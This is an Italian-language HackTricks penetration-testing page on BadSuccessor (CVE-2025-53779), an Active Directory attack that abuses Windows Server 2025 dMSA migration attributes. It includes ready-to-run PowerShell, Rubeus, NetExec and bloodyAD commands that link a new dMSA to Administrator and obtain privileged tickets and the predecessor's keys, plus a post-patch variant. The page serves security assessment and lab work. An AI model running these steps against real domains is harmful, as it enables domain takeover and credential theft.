# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

**BadSuccessor** sfrutta il flusso di migrazione degli **account di servizio gestiti delegati** (**dMSA**), introdotto in **Windows Server 2025**. Un dMSA può essere collegato a un account legacy tramite **`msDS-ManagedAccountPrecededByLink`** e attraversare gli stati di migrazione memorizzati in **`msDS-DelegatedMSAState`**. Se un attaccante può creare un dMSA in una OU scrivibile e controllare quegli attributi, il KDC può rilasciare ticket per il dMSA controllato dall’attaccante con il **contesto di autorizzazione dell’account collegato**.<sup>[[2]](#references)</sup>

In pratica, ciò significa che un utente con privilegi limitati e soli diritti delegati sulla OU può creare un nuovo dMSA, associarlo a `Administrator`, completare lo stato di migrazione e ottenere quindi un TGT il cui PAC contiene gruppi privilegiati come **Domain Admins**.<sup>[[2]](#references)</sup>

## Dettagli della migrazione dMSA rilevanti

- dMSA è una funzionalità di **Windows Server 2025**.
- `Start-ADServiceAccountMigration` imposta la migrazione sullo stato **avviato**.
- `Complete-ADServiceAccountMigration` imposta la migrazione sullo stato **completato**.
- `msDS-DelegatedMSAState = 1` significa che la migrazione è stata avviata.
- `msDS-DelegatedMSAState = 2` significa che la migrazione è stata completata.
- Durante una migrazione legittima, il dMSA dovrebbe sostituire in modo trasparente l’account precedente, quindi KDC/LSA mantengono gli accessi già posseduti dall’account precedente.<sup>[[3]](#references)</sup>

Microsoft Learn nota inoltre che, durante la migrazione, l’account originale è associato al dMSA e che il dMSA dovrebbe poter accedere alle risorse a cui poteva accedere il vecchio account.<sup>[[3]](#references)</sup> È proprio questo presupposto di sicurezza che BadSuccessor sfrutta.<sup>[[2]](#references)</sup>

## Requisiti

1. Un dominio in cui **dMSA è disponibile**, ovvero il lato AD supporta **Windows Server 2025**.
2. L’attaccante può **creare** oggetti `msDS-DelegatedManagedServiceAccount` in una OU oppure dispone di diritti equivalenti e più ampi per creare oggetti figlio al suo interno.
3. L’attaccante può **modificare** gli attributi dMSA pertinenti oppure controlla completamente il dMSA appena creato.
4. L’attaccante può richiedere ticket Kerberos da un contesto aggiunto al dominio o tramite un tunnel che raggiunge LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Verifiche pratiche

Il segnale più chiaro per l’operatore è verificare il livello del dominio/della foresta e confermare che l’ambiente utilizzi già il nuovo stack Server 2025:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Se vedi valori come `Windows2025Domain` e `Windows2025Forest`, considera **BadSuccessor / dMSA migration abuse** una verifica prioritaria.

Puoi anche enumerare le OU scrivibili delegate per la creazione di dMSA con strumenti pubblici:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Flusso di abuso

1. Crea un dMSA in un'OU in cui disponi dei diritti delegati di creazione di oggetti figlio.
2. Imposta **`msDS-ManagedAccountPrecededByLink`** sul DN di un target privilegiato, ad esempio `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Imposta **`msDS-DelegatedMSAState`** su `2` per contrassegnare la migrazione come completata.
4. Richiedi un TGT per il nuovo dMSA e usa il ticket restituito per accedere ai servizi privilegiati.<sup>[[2]](#references)</sup>

Esempio di PowerShell:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Richiesta di ticket / esempi di strumenti operativi:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Perché è più di una privilege escalation

Durante una migrazione legittima, Windows deve anche consentire al nuovo dMSA di gestire i ticket emessi per l'account precedente prima del cutover. Per questo, il materiale dei ticket relativo a dMSA può includere chiavi **correnti** e **precedenti** nel flusso **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Nel caso di una migrazione fittizia controllata da un attacker, questo comportamento può trasformare BadSuccessor in:<sup>[[2]](#references)</sup>

- **Privilege escalation** tramite l'ereditarietà dei SID dei gruppi privilegiati nel PAC.
- **Esposizione di materiale delle credenziali**, perché la gestione delle chiavi precedenti può esporre materiale equivalente all'hash RC4/NT del predecessore nei workflow vulnerabili.

Questo rende la tecnica utile sia per il takeover diretto del dominio sia per operazioni successive, come pass-the-hash o una compromissione più ampia delle credenziali.

## BetterSuccessor dopo la patch del KDC

Il KDC aggiornato convalida entrambi i lati di una migrazione dMSA. Oltre a `msDS-ManagedAccountPrecededByLink` e allo stato di migrazione del dMSA, il predecessore deve puntare a sua volta al dMSA tramite `msDS-SupersededManagedAccountLink` e avere un `msDS-SupersededServiceAccountState` compatibile. Un collegamento unidirezionale ora non funziona; un account che può solo creare un dMSA non può designare un predecessore arbitrario. Con `CreateChild` per un dMSA in una OU **e** un accesso effettivo in scrittura agli attributi di migrazione dell'account di destinazione selezionato, un attacker può stabilire il collegamento reciproco. Il ticket del dMSA risultante può includere il contesto di autorizzazione del predecessore ed esporne le chiavi nel key package del dMSA. Si tratta di un percorso mirato per l'accesso alle credenziali e l'amplificazione dei privilegi, non della prova che il BadSuccessor originale, con destinazione arbitraria, sia ancora sfruttabile sui DC aggiornati.<sup>[[5]](#references)[[6]](#references)</sup>

In un lab in cui è confermato l'accesso in scrittura all'account di destinazione, `bloodyAD` può creare il dMSA ed eseguire le scritture di migrazione abbinate. Richiedi il ticket del dMSA usando il materiale Kerberos restituito e verifica le autorizzazioni effettive dell'account di destinazione prima di presumere che i suoi privilegi o il suo hash siano stati recuperati. Il nome del subcommand dello strumento, `badSuccessor`, non implica il comportamento unidirezionale senza patch.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Note sullo stato delle patch

Il comportamento originale di BadSuccessor **non è solo un problema teorico di una preview del 2025**. Microsoft gli ha assegnato **CVE-2025-53779** e ha pubblicato un aggiornamento di sicurezza nell’**agosto 2025**.<sup>[[4]](#references)</sup> Continua a documentare questo attacco per:

- **laboratori / CTF / esercitazioni assume-breach**
- **ambienti Windows Server 2025 senza patch**
- **convalida delle deleghe OU e dell’esposizione di dMSA durante le valutazioni**

Non dare per scontato che un dominio Windows Server 2025 sia vulnerabile solo perché esiste dMSA; verifica il livello delle patch e testa con attenzione.

## Strumenti

- [Strumenti Akamai BadSuccessor](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Modulo `badsuccessor` di NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - Abuso di dMSA con BadSuccessor per ottenere Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: abuso di dMSA per l’escalation dei privilegi in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Panoramica degli account di servizio gestiti delegati](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor è morto, lunga vita a BadSuccessor(?) ](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: continuare ad abusare di dMSA dopo la patch](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
